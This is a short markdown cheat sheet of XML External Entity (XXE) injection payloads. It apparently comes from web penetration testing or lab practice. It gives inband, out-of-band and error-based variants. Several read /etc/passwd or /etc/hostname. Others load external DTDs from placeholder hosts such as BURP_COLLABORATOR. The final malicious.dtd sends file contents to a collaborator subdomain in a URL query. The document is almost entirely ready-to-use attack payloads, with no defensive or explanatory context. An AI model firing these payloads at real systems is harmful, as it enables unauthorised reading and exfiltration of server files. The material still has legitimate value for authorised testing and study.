## XXE Payloads
### Inband XXE with general entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockchange>
<product>
<id>&xxe;</id>
</product>
</stockchange>
```
### Inband XXE with parameter entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
<stockchange>
<product>
<id>1</id>
</product>
</stockchange>
```
### Out of band XXE with general entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR"> ]>
<stockchange>
<product>
<id>&xxe;</id>
</product>
</stockchange>
```
### Out of band XXE with parameter entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR"> %xxe;]>
<stockchange>
<product>
<id>1</id>
</product>
</stockchange>
```
### Error based XXE with general entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://SERVER/malicious.dtd">]>
<stockchange>
<product>
<id>&xxe;</id>
</product>
</stockchange>
```
### Error based XXE with parameter entity(inband)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://SERVER/malicious.dtd"> %xxe;]>
<stockchange>
<product>
<id>1</id>
</product>
</stockchange>
```
malicious.dtd
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil
```
### Error based XXE with parameter entity(out of band)[Recieving response on burp collobarotor]
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
malicious.dtd
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```
